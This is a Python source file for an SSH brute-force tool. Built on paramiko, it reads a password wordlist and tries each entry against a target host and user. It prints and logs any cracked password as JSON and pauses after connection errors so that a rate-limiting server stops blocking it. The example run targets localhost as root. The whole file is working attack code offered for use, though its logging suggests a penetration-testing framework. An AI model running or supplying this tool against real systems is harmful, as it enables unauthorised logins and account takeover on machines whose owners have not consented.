import paramiko
import socket
import logging
import time
import os
import json
from datetime import datetime

# --- TELEMETRY SETUP ---
logger = logging.getLogger("SSH_BRUTE")

class SSHBrute:
    def __init__(self, target_ip, username, password_file="passwords.txt", port=22):
        self.target_ip = target_ip
        self.username = username
        self.password_file = password_file
        self.port = port
        self.ssh_client = paramiko.SSHClient()
        # Auto-accept keys avoids user prompt blocking
        self.ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    def _log_event(self, event_type, details, severity="INFO"):
        """
        Helper to structure logs as JSON for SIEM integration.
        """
        log_payload = {
            "timestamp": datetime.utcnow().isoformat(),
            "module": "[exploit] SSHBrute",
            "event_type": event_type,
            "target": self.target_ip,
            "user": self.username,
            "data": details
        }
        msg = json.dumps(log_payload)
        
        if severity == "WARNING":
            logger.warning(msg)
        elif severity == "CRITICAL":
            logger.critical(msg)
        elif severity == "ERROR":
            logger.error(msg)
        else:
            logger.info(msg)

    def run_attack(self):
        """
        Executes the dictionary attack against the SSH service.
        """
        if not os.path.exists(self.password_file):
            msg = f"Password file '{self.password_file}' not found."
            self._log_event("CONFIG_ERROR", {"error": msg}, severity="ERROR")
            print(f"[!] {msg}")
            return None

        print(f"[*] Starting SSH Brute-Force on {self.target_ip} user: {self.username}...")
        
        # Log Start
        self._log_event("ATTACK_START", {"port": self.port, "wordlist": self.password_file})
        
        consecutive_errors = 0
        MAX_FAILURES = 5 

        try:
            with open(self.password_file, 'r', encoding='utf-8', errors='ignore') as f:
                for line in f:
                    password = line.strip()
                    if not password: continue 

                    try:
                        # Attempt Connection
                        self.ssh_client.connect(
                            self.target_ip, 
                            port=self.port, 
                            username=self.username, 
                            password=password, 
                            timeout=3 
                        )
                        
                        # --- SUCCESS ---
                        print(f"\n[+] SUCCESS: Password found: {password}")
                        
                        self._log_event("CREDENTIALS_CRACKED", {
                            "password": password,
                            "status": "Success"
                        }, severity="WARNING")
                        
                        return password
                    
                    except paramiko.AuthenticationException:
                        # Failed login - Normal behavior
                        print(f"[-] Failed: {password}") 
                        consecutive_errors = 0 
                        
                    except (socket.error, paramiko.SSHException) as e:
                        # --- FIX: RESILIENCE BLOCK ---
                        consecutive_errors += 1
                        print(f"[!] Connection Error ({consecutive_errors}/{MAX_FAILURES}): {e}")
                        print(f"    -> Pausing 5 seconds for rate-limit cooldown...")
                        
                        if consecutive_errors >= MAX_FAILURES:
                            print("[!] Too many errors. Host down or blocking.")
                            self._log_event("ATTACK_ABORTED", {"reason": "Max Connection Failures", "error": str(e)}, severity="ERROR")
                            break
                        
                        # FIX: Wait longer to allow server to unblock us
                        time.sleep(5) 
                        continue 
                    
                    finally:
                        # --- FIX: RESOURCE LEAK ---
                        # Explicitly close the socket after EVERY attempt.
                        # This prevents "Too many open files" crashes.
                        self.ssh_client.close()
                    
                    # Rate Limiting (Normal delay between passwords)
                    time.sleep(0.1)
                    
        except Exception as e:
            self._log_event("CRITICAL_ERROR", {"error": str(e)}, severity="CRITICAL")
            print(f"[!] Critical Error: {e}")

        print("[-] Brute-force finished. No valid password found.")
        self._log_event("ATTACK_COMPLETE", {"status": "Failed"})
        return None

if __name__ == "__main__":
    # Standalone testing setup
    logging.basicConfig(level=logging.INFO, format='%(message)s')
    
    # Create dummy password file if missing
    if not os.path.exists("passwords.txt"):
        with open("passwords.txt", "w") as f:
            f.write("root\n123456\npassword\nadmin")
            
    attacker = SSHBrute("127.0.0.1", "root")
    attacker.run_attack()